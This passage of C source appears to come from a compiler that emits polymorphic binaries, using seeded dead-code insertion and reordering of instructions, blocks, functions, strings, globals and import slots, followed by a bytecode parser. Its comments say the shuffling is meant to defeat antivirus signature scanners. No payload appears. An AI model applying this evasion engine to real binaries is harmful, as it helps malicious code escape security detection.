                    new_instrs[1].src1 = make_operand(VK_TEMP, t1);
                    new_instrs[1].src2 = make_operand(VK_TEMP, t1);
                    new_instrs[1].type_code = TC_I32;
                    count = 2;

                } else {
                    // Dead copy
                    int t1 = temp_base++;
                    int t2 = temp_base++;

                    new_instrs[0] = make_instr(OP_CONST);
                    new_instrs[0].dest = make_operand(VK_TEMP, t1);
                    new_instrs[0].src1 = make_const_op(prng_range(prng, 500));
                    new_instrs[0].type_code = TC_I32;

                    new_instrs[1] = make_instr(OP_COPY);
                    new_instrs[1].dest = make_operand(VK_TEMP, t2);
                    new_instrs[1].src1 = make_operand(VK_TEMP, t1);
                    new_instrs[1].type_code = TC_I32;
                    count = 2;
                }

                if (count > 0) {
                    block_insert_instrs(blk, i, new_instrs, count);
                    i += count;
                }
            }
            i++;
        }
    }

    if (g_transform_debug) {
        fprintf(stderr, "[deadcode] %s: ended with temp_count=%d\n", func->name, temp_base);
    }
    func->temp_count = temp_base;
}

// Transform: NOP insertion
void transform_insert_nops(struct Function* func, struct Prng* prng, struct TransformConfig* cfg) {
    if (func->block_count == 0) return;

    for (int b = 0; b < func->block_count; b++) {
        struct Block* blk = &func->blocks[b];
        int i = 0;

        while (i < blk->instr_count) {
            if (prng_range(prng, 100) < get_genome()->nop_chance) {
                int nop_count = prng_range(prng, get_genome()->nop_max_count) + 1;
                struct Instruction* nops = (struct Instruction*)malloc(sizeof(struct Instruction) * nop_count);
                for (int j = 0; j < nop_count; j++) {
                    nops[j] = make_instr(OP_NOP);
                }
                block_insert_instrs(blk, i, nops, nop_count);
                free(nops);
                i += nop_count;
            }
            i++;
        }
    }
}

void transform_reorder_blocks(struct Function* func, struct Prng* prng) {
    if (prng_range(prng, 100) >= get_genome()->reorder_blocks_chance) return;
    if (func->block_count <= 2) return;  // 0 or 1 non-entry blocks: nothing to shuffle

    // Step 1: Add explicit JMPs for fall-through
    for (int b = 0; b < func->block_count - 1; b++) {
        struct Block* blk = &func->blocks[b];
        if (blk->instr_count == 0) {
            // Empty block: add JMP to next
            struct Instruction jmp = make_instr(OP_JMP);
            jmp.target_block = b + 1;
            block_insert_instrs(blk, 0, &jmp, 1);
            continue;
        }
        int last_op = blk->instrs[blk->instr_count - 1].opcode;
        if (last_op != OP_JMP && last_op != OP_RET && last_op != OP_RETV) {
            struct Instruction jmp = make_instr(OP_JMP);
            jmp.target_block = b + 1;
            block_insert_instrs(blk, blk->instr_count, &jmp, 1);
        }
    }

    // Step 2: Fisher-Yates shuffle of indices 1..N-1
    int n = func->block_count;
    int* perm = (int*)malloc(sizeof(int) * n);  // perm[new_pos] = old_idx
    for (int i = 0; i < n; i++) perm[i] = i;
    for (int i = n - 1; i > 1; i--) {
        int j = 1 + prng_range(prng, i);  // j in [1, i]
        int tmp = perm[i]; perm[i] = perm[j]; perm[j] = tmp;
    }

    // Step 3: Build reverse mapping: new_idx[old_idx] = new_position
    int* new_idx = (int*)malloc(sizeof(int) * n);
    for (int i = 0; i < n; i++) new_idx[perm[i]] = i;

    // Step 4: Update all jump targets
    for (int b = 0; b < n; b++) {
        struct Block* blk = &func->blocks[b];
        for (int i = 0; i < blk->instr_count; i++) {
            int op = blk->instrs[i].opcode;
            if (op == OP_JMP || op == OP_JZ || op == OP_JNZ) {
                blk->instrs[i].target_block = new_idx[blk->instrs[i].target_block];
            }
        }
    }

    // Step 5: Rearrange blocks
    struct Block* new_blocks = (struct Block*)malloc(sizeof(struct Block) * n);
    for (int i = 0; i < n; i++) new_blocks[i] = func->blocks[perm[i]];
    memcpy(func->blocks, new_blocks, sizeof(struct Block) * n);
    free(new_blocks);
    free(perm);
    free(new_idx);
}


int has_side_effects(struct Instruction* ins) {
    return ins->opcode == OP_CALL || ins->opcode == OP_CALLV
        || ins->opcode == OP_ICALL || ins->opcode == OP_ICALLV
        || ins->opcode == OP_SYSCALL
        || ins->opcode == OP_STORE || ins->opcode == OP_ALLOCA;
}

int is_memory_op(struct Instruction* ins) {
    return ins->opcode == OP_LOAD || ins->opcode == OP_STORE
        || ins->opcode == OP_CALL || ins->opcode == OP_CALLV
        || ins->opcode == OP_ICALL || ins->opcode == OP_ICALLV
        || ins->opcode == OP_SYSCALL;
}

int is_terminator(struct Instruction* ins) {
    return ins->opcode == OP_JMP || ins->opcode == OP_JZ || ins->opcode == OP_JNZ
        || ins->opcode == OP_RET || ins->opcode == OP_RETV;
}

// Collect VK_TEMP indices read by an instruction into reads[], return count
int collect_reads(struct Instruction* ins, int* reads) {
    int n = 0;
    if (ins->src1.kind == VK_TEMP) reads[n++] = ins->src1.index;
    if (ins->src2.kind == VK_TEMP) reads[n++] = ins->src2.index;
    // OP_STORE dest is actually a source (address)
    if (ins->opcode == OP_STORE && ins->dest.kind == VK_TEMP) reads[n++] = ins->dest.index;
    if (ins->opcode == OP_CALL || ins->opcode == OP_CALLV ||
        ins->opcode == OP_ICALL || ins->opcode == OP_ICALLV ||
        ins->opcode == OP_SYSCALL) {
        for (int a = 0; a < ins->arg_count; a++) {
            if (ins->args[a].kind == VK_TEMP) reads[n++] = ins->args[a].index;
        }
    }
    return n;
}

int are_independent(struct Instruction* a, struct Instruction* b) {
    if (has_side_effects(a) && has_side_effects(b)) return 0;
    if (is_memory_op(a) && is_memory_op(b)) return 0;

    // Get write targets (STORE writes through dest as address, not a def)
    int a_writes = (a->dest.kind == VK_TEMP && a->opcode != OP_STORE) ? a->dest.index : -1;
    int b_writes = (b->dest.kind == VK_TEMP && b->opcode != OP_STORE) ? b->dest.index : -1;

    int a_reads[32], b_reads[32];
    int a_rc = collect_reads(a, a_reads);
    int b_rc = collect_reads(b, b_reads);

    // RAW: a writes temp that b reads
    if (a_writes >= 0) {
        for (int i = 0; i < b_rc; i++) {
            if (b_reads[i] == a_writes) return 0;
        }
    }
    // WAR: b writes temp that a reads
    if (b_writes >= 0) {
        for (int i = 0; i < a_rc; i++) {
            if (a_reads[i] == b_writes) return 0;
        }
    }
    // WAW: both write same temp
    if (a_writes >= 0 && a_writes == b_writes) return 0;

    // VK_LOCAL: STORE writes through dest (kind==VK_LOCAL); LOAD reads through src1 (kind==VK_LOCAL)
    // This is a defensive check: in practice, the frontend gates VK_LOCAL via LOAD/STORE (memory ops),
    // so is_memory_op(a) && is_memory_op(b) already covers the common cases above.
    {
        int a_lw = (a->opcode == OP_STORE && a->dest.kind == VK_LOCAL) ? a->dest.index : -1;
        int b_lw = (b->opcode == OP_STORE && b->dest.kind == VK_LOCAL) ? b->dest.index : -1;
        // RAW: a stores to local that b reads
        if (a_lw >= 0) {
            if (b->src1.kind == VK_LOCAL && b->src1.index == a_lw) return 0;
            if (b->src2.kind == VK_LOCAL && b->src2.index == a_lw) return 0;
        }
        // WAR: b stores to local that a reads
        if (b_lw >= 0) {
            if (a->src1.kind == VK_LOCAL && a->src1.index == b_lw) return 0;
            if (a->src2.kind == VK_LOCAL && a->src2.index == b_lw) return 0;
        }
        // WAW: both store to same local
        if (a_lw >= 0 && a_lw == b_lw) return 0;
    }

    return 1;
}

void transform_reorder_instrs(struct Function* func, struct Prng* prng) {
    for (int b = 0; b < func->block_count; b++) {
        struct Block* blk = &func->blocks[b];
        int n = blk->instr_count;
        if (n <= 2) continue;

        int attempts = get_genome()->reorder_instrs_intensity * n;
        for (int att = 0; att < attempts; att++) {
            int pos = prng_range(prng, n - 1);  // pos in [0, n-2]

            if (is_terminator(&blk->instrs[pos]) || is_terminator(&blk->instrs[pos + 1]))
                continue;

            if (are_independent(&blk->instrs[pos], &blk->instrs[pos + 1])) {
                struct Instruction tmp = blk->instrs[pos];
                blk->instrs[pos] = blk->instrs[pos + 1];
                blk->instrs[pos + 1] = tmp;
            }
        }
    }
}

void transform_reorder_locals(struct Function* func, struct Prng* prng) {
    if (prng_range(prng, 100) >= get_genome()->reorder_locals_chance) return;
    if (func->local_count <= 1) return;

    int lc = func->local_count;

    // Fisher-Yates shuffle: build perm[old] = new
    int* perm = (int*)malloc(sizeof(int) * lc);
    for (int i = 0; i < lc; i++) perm[i] = i;
    for (int i = lc - 1; i > 0; i--) {
        int j = prng_range(prng, i + 1);
        int tmp = perm[i]; perm[i] = perm[j]; perm[j] = tmp;
    }

    // Remap all VK_LOCAL operands in all instructions
    for (int b = 0; b < func->block_count; b++) {
        struct Block* blk = &func->blocks[b];
        for (int i = 0; i < blk->instr_count; i++) {
            struct Instruction* ins = &blk->instrs[i];
            if (ins->dest.kind == VK_LOCAL) ins->dest.index = perm[ins->dest.index];
            if (ins->src1.kind == VK_LOCAL) ins->src1.index = perm[ins->src1.index];
            if (ins->src2.kind == VK_LOCAL) ins->src2.index = perm[ins->src2.index];
            if (ins->opcode == OP_CALL || ins->opcode == OP_CALLV ||
                ins->opcode == OP_ICALL || ins->opcode == OP_ICALLV ||
                ins->opcode == OP_SYSCALL) {
                for (int a = 0; a < ins->arg_count; a++) {
                    if (ins->args[a].kind == VK_LOCAL) ins->args[a].index = perm[ins->args[a].index];
                }
            }
        }
    }

    // Rearrange local_types[] and local_sizes[]
    int* new_types = (int*)malloc(sizeof(int) * lc);
    int* new_sizes = (int*)malloc(sizeof(int) * lc);
    for (int i = 0; i < lc; i++) {
        new_types[perm[i]] = func->local_types[i];
        new_sizes[perm[i]] = func->local_sizes[i];
    }
    memcpy(func->local_types, new_types, sizeof(int) * lc);
    memcpy(func->local_sizes, new_sizes, sizeof(int) * lc);

    free(new_types);
    free(new_sizes);
    free(perm);
}

// Helper to dump instructions for debugging
void dump_instructions(struct Function* func) {
    fprintf(stderr, "=== Instructions for %s (temps=%d, locals=%d) ===\n",
            func->name, func->temp_count, func->local_count);
    for (int b = 0; b < func->block_count; b++) {
        struct Block* blk = &func->blocks[b];
        fprintf(stderr, "Block %d (%s): %d instrs\n", b, blk->label ? blk->label : "?", blk->instr_count);
        for (int i = 0; i < blk->instr_count; i++) {
            struct Instruction* ins = &blk->instrs[i];
            if (ins->opcode == 96 || ins->opcode == 97 ||
                ins->opcode == 100 || ins->opcode == 101) {  // CALL, CALLV, ICALL, ICALLV
                fprintf(stderr, "  [%d] op=%d CALL func=%d argc=%d dest=(%d,%d)",
                        i, ins->opcode, ins->func_idx, ins->arg_count,
                        ins->dest.kind, ins->dest.index);
                for (int a = 0; a < ins->arg_count; a++) {
                    fprintf(stderr, " arg%d=(%d,%d,%d)", a,
                            ins->args[a].kind, ins->args[a].index, ins->args[a].value);
                }
                fprintf(stderr, "\n");
            } else {
                fprintf(stderr, "  [%d] op=%d dest=(%d,%d) src1=(%d,%d,%d) src2=(%d,%d,%d)\n",
                        i, ins->opcode,
                        ins->dest.kind, ins->dest.index,
                        ins->src1.kind, ins->src1.index, ins->src1.value,
                        ins->src2.kind, ins->src2.index, ins->src2.value);
            }
        }
    }
}

// Per-seed permutation of extern api_slot values.
// Builtins (slots 0-6: malloc, free, read, write, open, close, exit) are
// permuted among themselves; user externs (slots 8+) are permuted among
// themselves. Slot 7 (fallback stub) is left alone. The (name -> slot)
// mapping is randomized, but the SET of slots in use is preserved, so
// extern_info / IDT / IAT writers (which walk slots in order) still
// produce a complete table — just with permuted contents. Callers
// must NOT invoke this in CF_ABS_ELF mode, where build_elf_syscall_wrappers
// emits wrapper bodies coupled to specific slot positions.
void permute_api_slots(struct Module* mod, struct Prng* prng) {
    int n = mod->func_count;
    int builtin_indices[7];
    int builtin_slots[7];
    int n_builtins = 0;
    int n_users = 0;

    // Count user externs first so we can size the buffer
    for (int i = 0; i < n; i++) {
        if (mod->funcs[i].block_count > 0) continue;
        int sl = mod->funcs[i].api_slot;
        if (sl >= 0 && sl < 7) {
            builtin_indices[n_builtins] = i;
            builtin_slots[n_builtins] = sl;
            n_builtins++;
        } else if (sl >= 8) {
            n_users++;
        }
    }

    // Permute builtin slots among themselves
    if (n_builtins > 1) {
        for (int i = n_builtins - 1; i > 0; i--) {
            int j = (int)prng_range(prng, i + 1);
            int tmp = builtin_slots[i]; builtin_slots[i] = builtin_slots[j]; builtin_slots[j] = tmp;
        }
        for (int i = 0; i < n_builtins; i++) {
            mod->funcs[builtin_indices[i]].api_slot = builtin_slots[i];
        }
    }

    // Permute user-extern slots among themselves
    if (n_users > 1) {
        int* user_indices = (int*)malloc(sizeof(int) * n_users);
        int* user_slots   = (int*)malloc(sizeof(int) * n_users);
        int k = 0;
        for (int i = 0; i < n; i++) {
            if (mod->funcs[i].block_count > 0) continue;
            int sl = mod->funcs[i].api_slot;
            if (sl >= 8) {
                user_indices[k] = i;
                user_slots[k] = sl;
                k++;
            }
        }
        for (int i = n_users - 1; i > 0; i--) {
            int j = (int)prng_range(prng, i + 1);
            int tmp = user_slots[i]; user_slots[i] = user_slots[j]; user_slots[j] = tmp;
        }
        for (int i = 0; i < n_users; i++) {
            mod->funcs[user_indices[i]].api_slot = user_slots[i];
        }
        free(user_indices);
        free(user_slots);
    }
}

// Shuffle function order in the module (IR-level).
// Shuffles ALL functions including externs. API table slots are resolved by
// name (api_slot field) so the loader mapping stays correct after shuffling.
// Also shuffles the string table (skip index 0 = dll_idx "no DLL" sentinel).
void transform_reorder_funcs(struct Module* mod, struct Prng* prng) {
    if (prng_range(prng, 100) >= get_genome()->reorder_funcs_chance) return;
    int n = mod->func_count;

    if (n <= 1) return;

    // Fisher-Yates shuffle of ALL functions (including externs)
    int* perm = (int*)malloc(sizeof(int) * n);
    for (int i = 0; i < n; i++) perm[i] = i;
    for (int i = n - 1; i > 0; i--) {
        int j = prng_range(prng, i + 1);
        int tmp = perm[i]; perm[i] = perm[j]; perm[j] = tmp;
    }

    // Build inverse: inv[old_idx] = new_idx
    int* inv = (int*)malloc(sizeof(int) * n);
    for (int i = 0; i < n; i++) inv[perm[i]] = i;

    // Apply shuffle
    struct Function* new_funcs = (struct Function*)malloc(sizeof(struct Function) * n);
    for (int i = 0; i < n; i++) new_funcs[i] = mod->funcs[perm[i]];
    free(mod->funcs);
    mod->funcs = new_funcs;

    // Update entry function index
    mod->entry_func = inv[mod->entry_func];

    // Patch all CALL/CALLV func_idx references
    for (int f = 0; f < n; f++) {
        struct Function* func = &mod->funcs[f];
        for (int b = 0; b < func->block_count; b++) {
            struct Block* blk = &func->blocks[b];
            for (int i = 0; i < blk->instr_count; i++) {
                struct Instruction* ins = &blk->instrs[i];
                if (ins->opcode == OP_CALL || ins->opcode == OP_CALLV ||
                    ins->opcode == OP_FUNC_ADDR) {
                    ins->func_idx = inv[ins->func_idx];
                }
            }
        }
    }

    free(perm);
    free(inv);

    // Shuffle the string table so string order in .mcb varies.
    // Skip index 0: dll_idx=0 is the "no DLL" sentinel in the .mcb format,
    // so no string index must ever remap TO 0.
    if (mod->string_count > 2) {
        int sc = mod->string_count;
        int* sr = (int*)malloc(sizeof(int) * sc);
        int* si = (int*)malloc(sizeof(int) * sc);
        for (int i = 0; i < sc; i++) sr[i] = i;
        // Fisher-Yates on indices 1..sc-1 only (keep index 0 fixed)
        for (int i = sc - 1; i > 1; i--) {
            int j = 1 + prng_range(prng, i);  // j in [1, i]
            int t = sr[i]; sr[i] = sr[j]; sr[j] = t;
            char* ts = mod->strings[i]; mod->strings[i] = mod->strings[j]; mod->strings[j] = ts;
        }
        // si[old] = new
        for (int i = 0; i < sc; i++) si[sr[i]] = i;
        // Update name_idx/dll_idx in functions
        for (int i = 0; i < n; i++) {
            mod->funcs[i].name_idx = si[mod->funcs[i].name_idx];
            if (mod->funcs[i].dll_idx > 0)
                mod->funcs[i].dll_idx = si[mod->funcs[i].dll_idx];
        }
        // Update global name_idx and string-valued init_value
        for (int i = 0; i < mod->global_count; i++) {
            mod->globals[i].name_idx = si[mod->globals[i].name_idx];
            if (mod->globals[i].init_kind == 2)
                mod->globals[i].init_value = si[mod->globals[i].init_value];
        }
        // Remap VK_STRING operand indices in all instructions
        for (int fi = 0; fi < n; fi++) {
            for (int bi = 0; bi < mod->funcs[fi].block_count; bi++) {
                struct Block* blk = &mod->funcs[fi].blocks[bi];
                for (int ii = 0; ii < blk->instr_count; ii++) {
                    struct Instruction* ins = &blk->instrs[ii];
                    if (ins->dest.kind == VK_STRING) ins->dest.index = si[ins->dest.index];
                    if (ins->src1.kind == VK_STRING) ins->src1.index = si[ins->src1.index];
                    if (ins->src2.kind == VK_STRING) ins->src2.index = si[ins->src2.index];
                    for (int ai = 0; ai < ins->arg_count; ai++) {
                        if (ins->args[ai].kind == VK_STRING) ins->args[ai].index = si[ins->args[ai].index];
                    }
                }
            }
        }
        free(sr);
        free(si);
    }

    // Shuffle the globals[] array so the recognizable sequence of small-int
    // initializers (GI_* constants, magic numbers, etc.) no longer lands at
    // a deterministic offset in .data. Per-byte match probability across
    // seeds drops to roughly 1/N, defeating fixed-offset and sliding-window
    // signature scanners. Same Fisher-Yates pattern as the string shuffle
    // above; remaps every VK_GLOBAL operand by the resulting permutation.
    // g_bundle_header etc. are found by strcmp name lookup, so shuffling is
    // safe wrt auto-embed.
    if (mod->global_count > 1) {
        int gc = mod->global_count;
        int* gperm = (int*)malloc(sizeof(int) * gc);
        for (int i = 0; i < gc; i++) gperm[i] = i;
        for (int i = gc - 1; i > 0; i--) {
            int j = prng_range(prng, i + 1);
            int t = gperm[i]; gperm[i] = gperm[j]; gperm[j] = t;
        }
        // gperm[i] = new position of element originally at i
        // Reorder globals[] so new_globals[gperm[i]] = old_globals[i]
        struct Global* new_globals = (struct Global*)malloc(sizeof(struct Global) * gc);
        for (int i = 0; i < gc; i++) new_globals[gperm[i]] = mod->globals[i];
        free(mod->globals);
        mod->globals = new_globals;
        // Remap VK_GLOBAL operands in all instructions
        for (int fi = 0; fi < n; fi++) {
            for (int bi = 0; bi < mod->funcs[fi].block_count; bi++) {
                struct Block* blk = &mod->funcs[fi].blocks[bi];
                for (int ii = 0; ii < blk->instr_count; ii++) {
                    struct Instruction* ins = &blk->instrs[ii];
                    if (ins->dest.kind == VK_GLOBAL) ins->dest.index = gperm[ins->dest.index];
                    if (ins->src1.kind == VK_GLOBAL) ins->src1.index = gperm[ins->src1.index];
                    if (ins->src2.kind == VK_GLOBAL) ins->src2.index = gperm[ins->src2.index];
                    for (int ai = 0; ai < ins->arg_count; ai++) {
                        if (ins->args[ai].kind == VK_GLOBAL) ins->args[ai].index = gperm[ins->args[ai].index];
                    }
                }
            }
        }
        free(gperm);
    }
}

// Apply all IR transformations to the module
void transform_module(struct Module* mod, struct Prng* prng, int verbose, struct TransformConfig* cfg_override) {
    struct TransformConfig cfg = cfg_override ? *cfg_override : default_transform_config();

    if (verbose) {
        fprintf(stderr, "Applying IR transformations (seed-dependent)...\n");
    }

    for (int f = 0; f < mod->func_count; f++) {
        struct Function* func = &mod->funcs[f];

        // Skip extern functions (no blocks)
        if (func->block_count == 0) continue;

        int orig_instrs = 0;
        for (int b = 0; b < func->block_count; b++) {
            orig_instrs += func->blocks[b].instr_count;
        }

        // Apply transformations in order (respecting enable flags)
        if (cfg.enable_unfold) {
            transform_unfold_constants(func, prng, &cfg);
        }
        if (cfg.enable_substitute) {
            transform_substitute_instrs(func, prng, &cfg);
        }
        if (cfg.enable_reorder_instrs) {
            transform_reorder_instrs(func, prng);
        }
        if (cfg.enable_dead_code) {
            transform_insert_dead_code(func, prng, &cfg);
        }
        if (cfg.enable_nops) {
            transform_insert_nops(func, prng, &cfg);
        }
        if (cfg.enable_reorder) {
            transform_reorder_blocks(func, prng);
        }
        if (cfg.enable_reorder_locals) {
            transform_reorder_locals(func, prng);
        }

        // Shuffle temp indices for polymorphic temp numbering
        if (cfg.enable_unfold || cfg.enable_substitute || cfg.enable_dead_code ||
            cfg.enable_nops || cfg.enable_reorder_instrs || cfg.enable_reorder ||
            cfg.enable_reorder_locals) {
            transform_shuffle_temps(func, prng);
        }

        int new_instrs = 0;
        for (int b = 0; b < func->block_count; b++) {
            new_instrs += func->blocks[b].instr_count;
        }

        if (verbose) {
            fprintf(stderr, "  %s: %d -> %d instrs, %d -> %d temps\n",
                    func->name, orig_instrs, new_instrs,
                    orig_instrs > 0 ? func->temp_count - (new_instrs - orig_instrs) : 0,
                    func->temp_count);
        }

        // Dump function instructions for debugging — set DUMP_FN env var to a function name
        if (g_transform_debug) {
            const char* dump_fn = getenv("DUMP_FN");
            if (dump_fn == NULL) dump_fn = "main";
            if (strcmp(dump_fn, "*") == 0 || strcmp(func->name, dump_fn) == 0) {
                dump_instructions(func);
            }
        }
    }

    // Module-level transform: function order reordering
    if (cfg.enable_reorder_funcs) {
        transform_reorder_funcs(mod, prng);
        if (verbose) {
            fprintf(stderr, "  [reorder_funcs] shuffled %d functions, entry now index %d\n",
                    mod->func_count, mod->entry_func);
        }
    }
}

// =============================================================================
//
// Bytecode Module
//
// Contains the following sections:
//   1. Bytecode reader (low-level u8/u16/i32 readers)
//   2. Bytecode parser (.mcb -> Module)
//   3. Bytecode writer (Module -> .mcb)
//
// =============================================================================

// =============================================================================
// Bytecode Reader
// =============================================================================

struct BytecodeReader {
    char* data;
    int len;
    int pos;
};

int bc_read_u8(struct BytecodeReader* r) {
    if (r->pos >= r->len) return 0;
    return (unsigned char)r->data[r->pos++];
}

int bc_read_u16(struct BytecodeReader* r) {
    int lo = bc_read_u8(r);
    int hi = bc_read_u8(r);
    return lo | (hi << 8);
}

int bc_read_i32(struct BytecodeReader* r) {
    int b0 = bc_read_u8(r);
    int b1 = bc_read_u8(r);
    int b2 = bc_read_u8(r);
    int b3 = bc_read_u8(r);
    return b0 | (b1 << 8) | (b2 << 16) | (b3 << 24);
}

struct Operand bc_read_value(struct BytecodeReader* r) {
    struct Operand op = {0, 0, 0};
    int kind = bc_read_u8(r);
    op.kind = kind;

    if (kind == VK_CONST) {
        op.value = bc_read_i32(r);
    } else {
        // All non-const operands: u16 index
        op.index = bc_read_u16(r);
    }
    return op;
}

// =============================================================================
// Bytecode Parser
// =============================================================================

struct Module* parse_bytecode(char* data, int len) {
    struct BytecodeReader reader = {data, len, 0};
    struct BytecodeReader* r = &reader;


    // Read header
    int magic = bc_read_i32(r);
    if (magic != MC_MAGIC) {
        fprintf(stderr, "Invalid bytecode magic\n");
        return NULL;
    }

    int version = bc_read_u16(r);  // Python writes as uint16
    int target = bc_read_u8(r);
    int flags = bc_read_u8(r);     // Python writes target + flags as 2 bytes
    int string_count = bc_read_u16(r);
    int struct_count = bc_read_u16(r);
    int global_count = bc_read_u16(r);
    int func_count = bc_read_u16(r);


    struct Module* mod = (struct Module*)malloc(sizeof(struct Module));
    mod->string_count = string_count;
    mod->global_count = global_count;
    mod->func_count = func_count;
    mod->entry_func = 0;

    // Read strings - Python format: total_size(u32), offsets(u32 each), then data
    mod->strings = (char**)malloc(sizeof(char*) * (string_count + 1));
    int total_string_size = bc_read_i32(r);  // total size of string data

    // Read string offsets
    int* str_offsets = (int*)malloc(sizeof(int) * (string_count + 1));
    for (int i = 0; i < string_count; i++) {
        str_offsets[i] = bc_read_i32(r);  // Python writes u32 offsets
    }

    // Now read string data - each string is null-terminated
    int str_data_start = r->pos;
    for (int i = 0; i < string_count; i++) {
        r->pos = str_data_start + str_offsets[i];
        int slen = 0;
        while (r->pos < r->len && r->data[r->pos] != 0) {
            slen++;
            r->pos++;
        }
        mod->strings[i] = (char*)malloc(slen + 1);
        memcpy(mod->strings[i], r->data + str_data_start + str_offsets[i], slen);
        mod->strings[i][slen] = 0;
    }
    r->pos = str_data_start + total_string_size;  // move past string data
    free(str_offsets);

    // Skip structs - Python format: name_idx(u16), size(u16), align(u8), field_count(u8)
    // Then per field: name_idx(u16), type(u8), offset(u16)
    for (int i = 0; i < struct_count; i++) {
        bc_read_u16(r); // name_idx
        bc_read_u16(r); // size
        bc_read_u8(r);  // align
        int field_count = bc_read_u8(r);
        for (int j = 0; j < field_count; j++) {
            bc_read_u16(r); // field name_idx
            bc_read_u8(r);  // type
            bc_read_u16(r); // offset
        }
    }

    // Read globals - Python format: name_idx(u16), type_code(u8), init_kind(u8), init_value(i32)
    mod->globals = (struct Global*)malloc(sizeof(struct Global) * (global_count + 1));
    for (int i = 0; i < global_count; i++) {
        int name_idx = bc_read_u16(r);
        mod->globals[i].name_idx = name_idx;
        mod->globals[i].name = mod->strings[name_idx];
        mod->globals[i].type_code = bc_read_u8(r);
        mod->globals[i].init_kind = bc_read_u8(r);
        mod->globals[i].init_value = bc_read_i32(r);
        // Infer size from type
        if (mod->globals[i].type_code == TC_I8) {
            mod->globals[i].size = 1;
        } else {
            mod->globals[i].size = 4;  // i32 or ptr
        }
    }

    // Read functions
    mod->funcs = (struct Function*)malloc(sizeof(struct Function) * func_count);
    for (int i = 0; i < func_count; i++) {
        struct Function* f = &mod->funcs[i];

        int name_idx = bc_read_u16(r);
        if (name_idx >= string_count) {
            fprintf(stderr, "ERROR: name_idx out of bounds!\n");
            return NULL;
        }
        f->name_idx = name_idx;
        f->name = mod->strings[name_idx];
        f->return_type = bc_read_u8(r);
        f->param_count = bc_read_u8(r);
        f->local_count = bc_read_u8(r);
        f->block_count = bc_read_u16(r);
        f->temp_count = bc_read_u16(r);

        // Read DLL name index (0 = no DLL, >0 = string index of DLL name)
        f->dll_idx = bc_read_u16(r);
        if (f->dll_idx > 0 && f->dll_idx < string_count) {
            f->dll_name = mod->strings[f->dll_idx];
        } else {
            f->dll_name = NULL;
        }

        f->api_slot = -1;  // Set properly after all functions are read

        // Check for main
        if (strcmp(f->name, "main") == 0) {
            mod->entry_func = i;
        }

        // Read param types
        f->param_types = (int*)malloc(sizeof(int) * (f->param_count + 1));
        for (int j = 0; j < f->param_count; j++) {
            f->param_types[j] = bc_read_u8(r);
        }

        // Read local types and sizes
        f->local_types = (int*)malloc(sizeof(int) * (f->local_count + 1));
        f->local_sizes = (int*)malloc(sizeof(int) * (f->local_count + 1));
        for (int j = 0; j < f->local_count; j++) {
            f->local_types[j] = bc_read_u8(r);
            f->local_sizes[j] = bc_read_u16(r);
        }

        // Read blocks
        f->blocks = (struct Block*)malloc(sizeof(struct Block) * (f->block_count + 1));
        for (int b = 0; b < f->block_count; b++) {
            struct Block* blk = &f->blocks[b];
            int label_idx = bc_read_u16(r);
            if (label_idx >= string_count) {
                fprintf(stderr, "ERROR: label_idx out of bounds!\n");
                return NULL;
            }
            blk->label = mod->strings[label_idx];
            blk->instr_count = bc_read_u16(r);
            blk->instrs = (struct Instruction*)malloc(sizeof(struct Instruction) * (blk->instr_count + 1));

            for (int k = 0; k < blk->instr_count; k++) {
                struct Instruction* ins = &blk->instrs[k];
                memset(ins, 0, sizeof(struct Instruction));

                int opcode = bc_read_u8(r);
                ins->opcode = opcode;

                if (opcode == OP_NOP) {
                    // No operands
                } else if (opcode == OP_CONST) {
                    ins->dest = bc_read_value(r);
                    ins->src1.value = bc_read_i32(r);
                    ins->src1.kind = VK_CONST;
                    ins->type_code = bc_read_u8(r);
                } else if (opcode == OP_NEG || opcode == OP_NOT || opcode == OP_COPY) {
                    // Unary operations - must check BEFORE the binary op range
                    ins->dest = bc_read_value(r);
                    ins->src1 = bc_read_value(r);
                    ins->type_code = bc_read_u8(r);
                } else if (opcode >= OP_ADD && opcode <= OP_GE) {
                    // Binary operations (excludes NEG/NOT/COPY which are checked above)
                    ins->dest = bc_read_value(r);
                    ins->src1 = bc_read_value(r);
                    ins->src2 = bc_read_value(r);
                    ins->type_code = bc_read_u8(r);
                } else if (opcode == OP_LOAD) {
                    ins->dest = bc_read_value(r);
                    ins->src1 = bc_read_value(r);
                    ins->type_code = bc_read_u8(r);
                } else if (opcode == OP_STORE) {
                    ins->dest = bc_read_value(r);
                    ins->src1 = bc_read_value(r);
                    ins->type_code = bc_read_u8(r);
                } else if (opcode == OP_ADDR) {
                    ins->dest = bc_read_value(r);
                    int loc_kind = bc_read_u8(r);
                    int loc_idx = bc_read_u8(r);
                    if (loc_kind == 1) {
                        loc_idx |= bc_read_u8(r) << 8;
                        ins->src1.kind = VK_GLOBAL;
                    } else {
                        ins->src1.kind = VK_LOCAL;
                    }
                    ins->src1.index = loc_idx;
                } else if (opcode == OP_PTRADD) {
                    ins->dest = bc_read_value(r);
                    ins->src1 = bc_read_value(r);
                    ins->src2 = bc_read_value(r);
                    ins->elem_size = bc_read_u16(r);
                } else if (opcode == OP_FIELDPTR) {
                    ins->dest = bc_read_value(r);
                    ins->src1 = bc_read_value(r);
                    ins->offset = bc_read_u16(r);
                } else if (opcode == OP_ALLOCA) {
                    ins->dest = bc_read_value(r);
                    ins->offset = bc_read_u16(r);    // size
                    ins->elem_size = bc_read_u8(r);  // align (Python writes u8)
                } else if (opcode == OP_JMP) {
                    ins->target_block = bc_read_u16(r);
                } else if (opcode == OP_JZ || opcode == OP_JNZ) {
                    ins->src1 = bc_read_value(r);
                    ins->target_block = bc_read_u16(r);
                } else if (opcode == OP_CALL) {
                    ins->dest = bc_read_value(r);
                    ins->func_idx = bc_read_u16(r);
                    ins->arg_count = bc_read_u8(r);
                    ins->args = (struct Operand*)malloc(sizeof(struct Operand) * (ins->arg_count + 1));
                    for (int a = 0; a < ins->arg_count; a++) {
                        ins->args[a] = bc_read_value(r);
                    }
                    // Note: Python doesn't write type_code for CALL
                } else if (opcode == OP_CALLV) {
                    ins->func_idx = bc_read_u16(r);
                    ins->arg_count = bc_read_u8(r);
                    ins->args = (struct Operand*)malloc(sizeof(struct Operand) * ins->arg_count);
                    for (int a = 0; a < ins->arg_count; a++) {
                        ins->args[a] = bc_read_value(r);
                    }
                } else if (opcode == OP_ICALL) {
                    ins->dest = bc_read_value(r);
                    ins->src1 = bc_read_value(r);
                    ins->arg_count = bc_read_u8(r);
                    ins->args = (struct Operand*)malloc(sizeof(struct Operand) * (ins->arg_count + 1));
                    for (int a = 0; a < ins->arg_count; a++) {
                        ins->args[a] = bc_read_value(r);
                    }
                } else if (opcode == OP_ICALLV) {
